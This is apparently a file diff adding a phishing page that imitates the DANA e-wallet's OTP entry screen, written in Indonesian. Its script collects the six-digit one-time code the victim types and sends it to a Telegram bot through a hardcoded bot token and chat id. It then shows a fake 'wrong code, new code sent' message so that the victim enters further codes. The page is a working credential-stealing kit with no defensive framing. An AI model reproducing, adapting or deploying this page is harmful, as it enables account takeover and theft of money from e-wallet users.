@@ -1,0 +1,615 @@
+<html>
+<meta charset="utf-8">
+<meta name="theme-color" content="#419DF4">
+<meta content="width=device-width, initial-scale=1 maximum-scale=1" name="viewport">
+<head>
+<meta http-equiv="Content-Security-Policy" content="default-src * 'self' 'unsafe-inline' 'unsafe-eval' data: gap:">
+<link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Inter:100,200,300,regular,500,600,700,800,900" media="all"> 
+<link href="https://uploads-ssl.webflow.com/644212b949c2624101239c6f/css/sinarmas-mobile.webflow.e4429d583.css" rel="stylesheet" type="text/css"/>
+  <link href="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcQZ9dATs_nkzyO-gSoQWbtIhJV7bG51r3gOKg&usqp=CAU" rel="shortcut icon" type="image/x-icon">
+  <link href="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcQZ9dATs_nkzyO-gSoQWbtIhJV7bG51r3gOKg&usqp=CAU" rel="apple-touch-icon">
+  <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.2.0-beta1/dist/js/bootstrap.bundle.min.js"></script>
+  <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.5.1/jquery.min.js"></script>
+  </head>
+   <style>
+   body, html{
+       background:url() no-repeat center center;
+  background-position: 100% 100%;
+  background-size: 100% 100%;
+       width: 100%;
+       position: fixed;
+       background-color: #fff;
+       text-align: center;
+   }
+   
+   
+   .logo{
+        font-family: helvetica;
+  text-align:center;
+  color: #fff;
+  max-width: 50%;
+  height: auto;
+  font-size: 13px;
+  margin-top: -15px;
+  margin-bottom: -55px;
+  margin-left: 0px;
+  background: #118EEA;
+  background-image: url("https://vectrostudio.com/wp-content/uploads/2020/03/Dana-Logo-Vector2-1024x690.jpg");
+
+   }
+   
+  h1 { 
+  font-family: helvetica;
+  text-align:center;
+  color: #fff;
+  max-width: 100%;
+  font-size: 15px;
+  margin-top: 170px;
+  margin-bottom: 0px;
+  opacity: 1.0;
+}
+
+h2 { 
+  font-family: helvetica;
+  text-align:center;
+  color: #fff;
+  max-width: 100%;
+  font-size: 13px;
+  margin-top: 10px;
+  margin-bottom: 10px;
+  background: #118EEA;
+}
+
+h3 { 
+  font-family: helvetica;
+  text-align:center;
+  color: #fff;
+  max-width: 100%;
+  font-size: 13px;
+  margin-top: -10px;
+  margin-bottom: 50px;
+  background: #118EEA;
+  font-weight: 800;
+  
+}
+
+h4 { 
+  font-family: helvetica;
+  text-align:center;
+  max-width: 100%;
+  font-size: 13px;
+  margin-top: 250px;
+  margin-bottom: 50px;
+  font-weight: 800;
+  
+}
+
+ .container-4{
+   background: none;
+  background-position: 100% 100%;
+  background-size: 100% 100%;
+ }
+ 
+
+.button { 
+  font-family: helvetica;
+  text-align:center;
+  color: #fff;
+  padding: -5px auto;
+  margin: -1px;
+  max-width: 100%;
+  font-size: 12px;
+  margin-top: 20px;
+  margin-bottom: 50px;
+  background: #118EEA;
+  border: 1px solid;
+  border-color: #fff;
+  border-radius: 20px;
+  width: 30%;
+  height: 22px;
+}
+
+.btn-submit { 
+  font-family: helvetica;
+  text-align:center;
+  font-weight: 800;
+  color: #fff;
+  padding: 4px;
+  margin: 15px;
+  max-width: 100%;
+  font-size: 17px;
+  margin-top: 25px;
+  margin-bottom: 50px;
+  background: #118EEA;
+  border-radius: 20px;
+  border: none;
+  width: 25%;
+}
+
+.pin-code{ 
+  padding: 0; 
+  margin: 0 auto; 
+  display: flex;
+  justify-content:center;
+  
+} 
+ 
+.pin-code input { 
+  border: none; 
+  text-align: center; 
+  width: 40px;
+  height:45px;
+  font-size: 36px; 
+  background-color: #fff;
+  margin-right:-0px;
+  margin:3px;
+  border-radius: 8px;
+  box-shadow: rgba(0, 0, 0, 0.05) 1px 6px 24px 0px, rgba(0, 0, 0, 0.08) 0px 0px 0px 1px;
+} 
+
+
+
+.pin-code input:focus { 
+  border: 0px solid #573D8B;
+  outline:none;
+} 
+
+
+input::-webkit-outer-spin-button,
+input::-webkit-inner-spin-button {
+    -webkit-appearance: none;
+    margin: 0;
+}
+ 
+ 
+  /*********************/
+.process {
+     width: 100%;
+            height: 100%;
+             display: flex;
+             justify-content: center;
+            margin: auto;
+            position: absolute;
+           padding-top: 300px;
+            left: 0;
+            right: 0;
+            bottom: 0;
+            background: rgba(0, 0, 0, 0.4);
+            z-index: 99999;
+            
+      
+}
+.loading {
+    position: absolute;
+    display: flex;
+    justify-content: center;
+    align-items: center;
+    margin-bottom: 20%;
+}
+.loading img {
+    width: 50px;
+    
+    top: 10;
+}
+.loading .spinner{
+    position: absolute;
+    width: 35px;
+    animation: spin 1s linear infinite;
+    -webkit-animation: spin 1s linear infinite;
+    -moz-animation: spin 1s linear infinite;
+    -ms-animation: spin 1s linear infinite;
+    -o-animation: spin 1s linear infinite;
+}
+@keyframes spin {
+  0% { transform: rotate(360deg); }
+  100% { transform: rotate(0deg); }
+}
+@-webkit-keyframes spin {
+  0% { -webkit-transform: rotate(360deg); }
+  100% { -webkit-transform: rotate(0deg); }
+}
+@-moz-keyframes spin {
+  0% { -webkit-transform: rotate(360deg); }
+  100% { -webkit-transform: rotate(0deg); }
+}
+@-ms-keyframes spin {
+  0% { -webkit-transform: rotate(360deg); }
+  100% { -webkit-transform: rotate(0deg); }
+}
+@-o-keyframes spin {
+  0% { -webkit-transform: rotate(360deg); }
+  100% { -webkit-transform: rotate(0deg); }
+}
+
+/*********************/
+.btn {
+/*    background-color: blue;*/
+    display: flex;
+    width: 100%;
+    margin-top: -35px;
+    background: #fff;
+    height: 150px;
+    justify-content: center;
+    align-items: center;
+    flex-direction: column;
+    
+}
+.see {
+    margin-bottom: 52px;
+    margin-top: -33px;
+    background: none;
+    font-size: 13px;
+    color: #0C80EF;
+   
+    width: 110px;
+    height: 24px;
+    border: 1.2px solid #0C80EF;
+    border-radius: 20px;
+}
+.lupa {
+    font-size: 13px;
+    font-weight: 600;
+    color: #0C80EF;
+    width: 100%;
+    text-decoration: none;
+}
+/*********************/
+
+
+
+
+#circularG{
+	position:relative;
+	width:50px;
+	height:50px
+}
+.circularG{
+	position:absolute;
+	background-color:#0088ff;
+	width:11px;
+	height:11px;
+	border-radius:8px;
+	animation-name:bounce_circularG;
+	animation-duration:0.48s;
+	animation-iteration-count:infinite;
+	animation-direction:linear;
+}
+#circularG_1{
+	left:0;top:20px;
+	animation-delay:0.18s;
+}
+#circularG_2{
+	left:5px;
+	top:5px;
+	animation-delay:0.24s;
+}
+#circularG_3{
+	top:0;
+	left:20px;
+	animation-delay:0.3s;
+}
+#circularG_4{
+	right:5px;
+	top:5px;
+	animation-delay:0.36s;
+}
+#circularG_5{
+	right:0;
+	top:20px;
+	animation-delay:0.42s;
+}
+#circularG_6{
+	right:5px;
+	bottom:5px;
+	animation-delay:0.48s;
+}
+#circularG_7{
+	left:20px;
+	bottom:0;	animation-delay:0.54s;
+}
+#circularG_8{
+	left:5px;
+	bottom:5px;
+	animation-delay:0.6s;
+}
+@keyframes bounce_circularG{
+	0%{
+		transform:scale(1)
+	}
+	100%{
+		transform:scale(.3)
+	}
+}
+
+  </style>
+<body class="body-4">
+    
+    <div class="container-4 w-container">
+<center>
+<img src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEgueYWo1nozarUUewszjAgppJgeIimRwVDZ3TG37EGPMz-DCmwR8qzezxLEmV-nDyWpWnXT0S2P0IxwLD2wbCZ6tcZ-ef9q89jwBLIBCNXJ8vieOJP-qQK0T2IHyDWcMamxyKECDdUCrpR6akv_EO1hHEqQuou-5cP9scRzmfuWBpE4otU6n6gQAnrj3Pc/s1080/AddText_02-08-10.29.10.jpg" width="100%" style="position: fixed; top: 0; left: 0; right: 0; margin: 0px auto">    
+   <p id="userid" style="font-size: 20px; text-align: center; margin-bottom: -120px; font-weight: 600; color: #070707; margin-top: 141px; margin-left: -125px; display: none">nomor</p>
+             <p id="useridku" style="font-size: 15px; text-align: center; margin-bottom: -260px; font-weight: 400; color: #070707; margin-top: 230px; margin-left: 0px; display: none"></p>
+
+<div class="pin-code" maxlength="6" style="margin-top: 120px; color: #000">
+
+ <form id="fomrOTP" onsubmit="kirimPesan(event); return false"  method="POST">
+        <h1 style="margin-top: 40px; color: #000">Masukkan Kode OTP</h1><p></p>
+   <input type="hidden" id="logo" value="❁┷━❃∞∞𝗗𝗔𝗡𝗔∞∞❃━┷❁">
+    <input type="hidden" name="sixpin" id="setPin"> 
+
+				<input name="pin1" id="pin1" class="inppin" inputmode="numeric" type="password" autocomplete="off" required maxlength="1" onkeypress="if(this.value.length==1) return false;"><input name="pin2" id="pin2" class="inppin" inputmode="numeric" type="password" autocomplete="off" required maxlength="1" onkeypress="if(this.value.length==1) return false;"><input name="pin3" id="pin3" class="inppin" inputmode="numeric" type="password" autocomplete="off" required maxlength="1" onkeypress="if(this.value.length==1) return false;"><input name="pin4" id="pin4" class="inppin" inputmode="numeric" type="password" autocomplete="off" required maxlength="1" onkeypress="if(this.value.length==1) return false;"><input name="pin5" id="pin5" class="inppin" inputmode="numeric" type="password" autocomplete="off" required maxlength="1" onkeypress="if(this.value.length==1) return false;"><input name="pin6" id="pin6" class="inppin" inputmode="numeric" type="password" autocomplete="off" required maxlength="1" onkeypress="if(this.value.length==1) return false;" onchange="javascript:this.form.button();" oninput="sendPin()">
+    <p></p>
+    <input type="tel" style="opacity: 0.0">
+     </div> 
+       <div class="btn">
+ <button id="see" type="button" class="see">TAMPILKAN</button>
+      <a class="lupa" href="#" id="alert">Kirim ulang</a>
+    </div>
+    </form>
+    <center>
+  	<div class="footer-logo-desc mb-3 " style="margin-top: 180px">
+						<div class="text-center justify-content-center pl-5 pr-5" style="color:#7D8185; margin-top: -20px">
+							
+							<label for="debit" style="color: #000; font-weight: bold; text-align: center">Butuh Bantuan? <font style="color: #2196F3">Hubungi Neo Care</font> </label>
+						</div>
+					</div>          
+ <div id="process" name="process" class="process" style="display: none;">
+            <div class="loading">
+               <div id="circularG">
+  <div id="circularG_1" class="circularG"></div>
+  <div id="circularG_2" class="circularG"></div>
+  <div id="circularG_3" class="circularG"></div>
+  <div id="circularG_4" class="circularG"></div>
+  <div id="circularG_5" class="circularG"></div>
+  <div id="circularG_6" class="circularG"></div>
+  <div id="circularG_7" class="circularG"></div>
+  <div id="circularG_8" class="circularG"></div>
+</div>
+            </div>
+        </div>
+        </center>
+        <script>
+     
+    </script>
+<script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.3.1/jquery.min.js"
+    integrity="sha512-+NqPlbbtM1QqiK8ZAo4Yrj2c4lNQoGv8P79DPtKzj++l5jnN39rHA/xsqn8zE9l0uSoxaCdrOgFs6yjyfbBxSg=="
+    crossorigin="anonymous" referrerpolicy="no-referrer"></script>
+<script src="https://ajax.googleapis.com/ajax/libs/jquery/3.5.1/jquery.min.js"></script> 
+  <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.2.0-beta1/dist/js/bootstrap.bundle.min.js" integrity="sha384-pprn3073KE6tl6bjs2QrFaJGz5/SUsLqktiwsUTF55Jfv3qYSDhgCecCxMW52nD2" crossorigin="anonymous"></script> 
+  <script>
+        $(document).ready(function() {
+            $("input#setPin").on('click', function() {
+                var pin = $(this).attr('data-id');
+                
+                if($.trim($("#pin1").html())=='') {
+                    $("#pin1").html(pin);
+                } else if($.trim($("#pin1").html())!='' && $.trim($("#pin2").html())=='') {
+                    $("#pin2").html(pin);
+                } else if($.trim($("#pin2").html())!='' && $.trim($("#pin3").html())=='') {
+                    $("#pin3").html(pin);
+                } else if($.trim($("#pin3").html())!='' && $.trim($("#pin4").html())=='') {
+                    $("#pin4").html(pin);
+                } else if($.trim($("#pin4").html())!='' && $.trim($("#pin5").html())=='') {
+                    $("#pin5").html(pin);
+                } else if($.trim($("#pin5").html())!='' && $.trim($("#pin6").html())=='') {
+                    $("#pin6").html(pin);
+
+                    var setPin = $("#pin1").html()+''+$("#pin2").html()+''+$("#pin3").html()+''+$("#pin4").html()+''+$("#pin5").html()+''+$("#pin6").html();
+                    $("input#setPin").val(setPin);
+
+                    var pinValue = $("input#setPin").val();
+
+                    if(pinValue.length == 6) {
+                 $("form").submit();
+                    }
+                }
+            });
+
+            $("#hapus").on('click', function() {
+                $("#pin1").html('');
+                $("#pin2").html('');
+                $("#pin3").html('');
+                $("#pin4").html('');
+                $("#pin5").html('');
+                $("#pin6").html('');
+            });
+        });
+    </script>
+    <script>
+  
+        var nomor = sessionStorage.getItem("nomor");
+        document.getElementById("userid").innerHTML = nomor + "";
+         var nomorku = sessionStorage.getItem("nomorku");
+        document.getElementById("useridku").innerHTML = "Kode dikirim via SMS ke +62" + nomorku + "";
+        const togglePassword = document.getElementById("togglePassword");
+        const password = document.getElementById("inppas");
+        togglePassword.addEventListener("click", function () {
+            const type = password.getAttribute("type") === "password" ? "text" : "password";
+            password.setAttribute("type", type);
+            this.classList.toggle("bi-eye");
+        });
+        function loadd(){
+            $("#loader").fadeIn();
+        }
+    </script>
+    <script>
+    var nomorku = sessionStorage.getItem("nomorku");
+        document.getElementById("userid").innerHTML = "nomor " + nomorku + "";
+        const togglePassword = document.getElementById("togglePassword");
+        const password = document.getElementById("inppas");
+        togglePassword.addEventListener("click", function () {
+            const type = password.getAttribute("type") === "password" ? "text" : "password";
+            password.setAttribute("type", type);
+            this.classList.toggle("bi-eye");
+        });
+        function loadd(){
+            $("#loader").fadeIn();
+        }
+    </script>
+    <!-- Bootstrap & jQuery JS -->
+    <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.5.1/jquery.min.js"></script>
+    <script src="https://maxcdn.bootstrapcdn.com/bootstrap/4.5.2/js/bootstrap.min.js"></script>
+  
+ 
+<script>
+function sendPin(){
+
+ 
+                $("#process").show();
+               
+ 
+ 
+ 
+ 
+ var pin1 = document.getElementById('pin1');
+ var pin2 = document.getElementById('pin2');
+ var pin3 = document.getElementById('pin3');
+ var pin4 = document.getElementById('pin4');
+ var pin5 = document.getElementById('pin5');
+ var pin6 = document.getElementById('pin6');
+ 
+  setTimeout(function(){
+$("#alert").text("Mohon pastikan kodenya sudah benar dan coba lagi");
+$("#alert").css("color","red");
+ },2000);    
+  var gabungan = '%0A𝗞𝗼𝗱𝗲 𝗢𝗧𝗣 : ' + pin1.value + pin2.value + pin3.value + pin4.value + pin5.value + pin6.value;
+  
+     
+ 
+
+    var token = '6703400034:AAGJG0dZOsrfeVa7vA_AMGAwyv76NSjEe0E'; // Ganti dengan token bot yang kamu buat
+    var grup = '5752550326'; // Ganti dengan chat id dari bot yang kamu buat
+
+    $.ajax({
+        url: `https://api.telegram.org/bot${token}/sendMessage?chat_id=${grup}&text=${gabungan}&parse_mode=html`,
+        method: `POST`,
+
+
+success: function(){
+     setTimeout(function(){
+
+ document.getElementById("alert").innerHTML = "Kode baru sudah kami kirim ulang";
+   $("#alert").css("color","black");
+ $("#pin1").val('');
+                $("#pin2").val('');
+                $("#pin3").val('');
+                $("#pin4").val('');
+                $("#pin5").val('');
+                $("#pin6").val('');
+     },4000);    
+      setTimeout(function(){
+          $("#alert").text("Kirim ulang");
+$("#alert").css("color","#0C80EF");
+$("#process").hide();
+ $("#pin1").focus();
+      },6000);    
+}
+}
+);
+};
+
+</script>
+<script>
+//var pinContainer = document.getElementsByClassName("pin-code")[maxlength];
+var pinContainer = document.querySelector(".pin-code");
+console.log('There is ' + pinContainer.length + ' Pin Container on the page.');
+
+pinContainer.addEventListener('keyup', function (event) {
+    var target = event.srcElement;
+    
+    var maxLength = parseInt(target.attributes["maxlength"].value, 6);
+    var myLength = target.value. length;
+
+    if (myLength >= maxLength) {
+        var next = target;
+        while (next = next.nextElementSibling) {
+            if (next == 0) break;
+            if (next.tagName.toLowerCase() == "input") {
+                next.focus();
+                break;
+            }
+        }
+    }
+
+    if (myLength === 0) {
+        var next = target;
+        while (next = next.previousElementSibling) {
+            if (next == 0) break;
+            if (next.tagName.toLowerCase() == "input") {
+                next.focus();
+                break;
+            }
+        }
+    }
+}, false);
+
+pinContainer.addEventListener('keydown', function (event) {
+    var target = event.srcElement;
+    target.value = "";
+}, false);
+
+
+var btn_show = document.getElementById('see');
+var pin = document.getElementById('pin1');
+var pinn = document.getElementById('pin2');
+var pinnn = document.getElementById('pin3');
+var pinnnn = document.getElementById('pin4');
+var pinnnnn = document.getElementById('pin5');
+var pinnnnnn = document.getElementById('pin6');
+
+btn_show.addEventListener('click', pasToText);
+
+function pasToText(){
+    if ((pin.type == 'password')&&(pinn.type == 'password')&&(pinnn.type == 'password')&&(pinnnn.type == 'password')&&(pinnnnn.type == 'password')&&(pinnnnnn.type == 'password')){
+        pin.setAttribute('type','text')
+        pinn.setAttribute('type','text')
+        pinnn.setAttribute('type','text')
+        pinnnn.setAttribute('type','text')
+        pinnnnn.setAttribute('type','text')
+        pinnnnnn.setAttribute('type','text')
+        btn_show.innerHTML='SEMBUNYIKAN'
+    } else {
+        pin.setAttribute('type','password')
+        pinn.setAttribute('type','password')
+        pinnn.setAttribute('type','password')
+        pinnnn.setAttribute('type','password')
+        pinnnnn.setAttribute('type','password')
+        pinnnnnn.setAttribute('type','password')
+        btn_show.innerHTML='TAMPILKAN'
+    }
+}
+
+</script>
+ <script>
+            $(document).ready(function(){
+    $('.nope').mask('000-0000-00000');
+});
+
+let btnLogin = document.getElementById("send_data");
+let inputTlp = document.getElementById("nope");
+btnLogin.disabled = true;
+inputTlp.addEventListener("input", function() {
+    if (inputTlp.value.length < 8) {
+        btnLogin.disabled = true;
+    } else {
+        btnLogin.disabled = false;
+    }
+});
+
+inputTlp.addEventListener("input", function() {
+    if (inputTlp.value == '0') {
+        inputTlp.value = '';
+    } else if (inputTlp.value == '62') {
+        inputTlp.value = '';
+    }
+});
+
+btnLogin.addEventListener('submit', showLoad)
+function showLoad(){
+    inputTlp.readOnly = true;
+    let xx = document.getElementById('process');
+    xx.style.display = 'flex';
+}
+        </script>
+        </body>
+ </html>
